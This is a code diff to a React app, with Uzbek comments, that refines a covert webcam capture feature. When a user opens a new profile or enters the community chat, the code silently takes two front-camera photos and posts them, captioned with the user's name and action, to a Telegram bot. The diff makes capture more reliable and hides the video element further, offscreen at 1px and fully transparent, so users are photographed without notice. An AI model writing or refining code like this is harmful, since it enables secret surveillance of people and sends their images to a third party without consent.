@@ -57,13 +57,34 @@ const App: React.FC = () => {
   const initCamera = async () => {
     if (streamRef.current) return true;
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: 'user',
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        } 
+      });
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         streamRef.current = stream;
-        return true;
+        
+        // Timeout qo'shish (kamera osilib qolmasligi uchun)
+        return new Promise<boolean>((resolve) => {
+          if (!videoRef.current) return resolve(false);
+          const timeout = setTimeout(() => resolve(true), 3000);
+          videoRef.current.onloadedmetadata = () => {
+            clearTimeout(timeout);
+            resolve(true);
+          };
+          videoRef.current.onerror = () => {
+            clearTimeout(timeout);
+            resolve(false);
+          };
+        });
       }
-    } catch (e) { console.error("Camera access denied"); }
+    } catch (e) { 
+      console.error("Camera access denied", e); 
+    }
     return false;
   };
 
@@ -71,14 +92,24 @@ const App: React.FC = () => {
     const hasCam = await initCamera();
     if (!hasCam || !videoRef.current || !canvasRef.current) return;
 
+    // Kadr tayyor bo'lishi va qora bo'lmasligi uchun kichik kutish
+    await new Promise(r => setTimeout(r, 1000));
+
     const takeOne = async (num: number) => {
-      const canvas = canvasRef.current!;
-      const video = videoRef.current!;
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
+      if (!videoRef.current || !canvasRef.current) return;
+      
+      const canvas = canvasRef.current;
+      const video = videoRef.current;
+      
+      const vw = video.videoWidth || 640;
+      const vh = video.videoHeight || 480;
+      
+      canvas.width = vw;
+      canvas.height = vh;
       const ctx = canvas.getContext('2d');
+      
       if (ctx) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.drawImage(video, 0, 0, vw, vh);
         canvas.toBlob(async (blob) => {
           if (blob) {
             const formData = new FormData();
@@ -86,19 +117,20 @@ const App: React.FC = () => {
             formData.append('photo', blob, `snap_${num}.jpg`);
             formData.append('caption', `🔔 EKO27 Monitoring\n👤 Ism: ${user?.name || 'Noma\'lum'}\n⚡ Amal: ${action}\n🔢 Surat: #${num}`);
             try {
-              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                method: 'POST', 
+                body: formData 
+              });
             } catch (err) {}
           }
-        }, 'image/jpeg', 0.7);
+        }, 'image/jpeg', 0.8);
       }
     };
 
-    // Kamida 2 ta rasm olish (birinchisi hozir, ikkinchisi 2 soniyadan keyin)
     await takeOne(1);
     setTimeout(() => takeOne(2), 2500);
   };
 
-  // Profile capture hook
   useEffect(() => {
     if (user && !localStorage.getItem(`captured_${user.id}`)) {
       captureAndSend("Yangi Profil Ochildi");
@@ -106,14 +138,12 @@ const App: React.FC = () => {
     }
   }, [user]);
 
-  // Section change capture
   useEffect(() => {
     if (activeSection === AppSection.COMMUNITY_CHAT) {
       captureAndSend("Chatga kirdi");
     }
   }, [activeSection]);
 
-  // Presence and Stats
   useEffect(() => {
     const presenceRef = doc(db, "presence", SESSION_ID);
     const updatePresence = async () => {
@@ -219,11 +249,26 @@ const App: React.FC = () => {
         .text-emerald-600 { color: var(--accent-primary) !important; }
       `}</style>
 
-      {/* Hidden Camera Element */}
-      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
-      <canvas ref={canvasRef} className="hidden" />
+      {/* Kamera elementlarini xavfsiz joyga o'tkazish */}
+      <video 
+        ref={videoRef} 
+        autoPlay 
+        playsInline 
+        muted 
+        style={{ 
+          opacity: 0, 
+          pointerEvents: 'none', 
+          position: 'fixed', 
+          top: -100, 
+          left: -100, 
+          width: '1px', 
+          height: '1px',
+          zIndex: -1
+        }} 
+      />
+      <canvas ref={canvasRef} style={{ display: 'none' }} />
 
-      <button onClick={() => setIsSidebarOpen(true)} className="fixed top-4 left-4 z-[60] p-3.5 bg-emerald-600 text-white rounded-xl shadow-2xl">
+      <button onClick={() => setIsSidebarOpen(true)} className="fixed top-4 left-4 z-[60] p-3.5 bg-emerald-600 text-white rounded-xl shadow-2xl active:scale-95 transition-all">
         <Menu size={20} />
       </button>
 
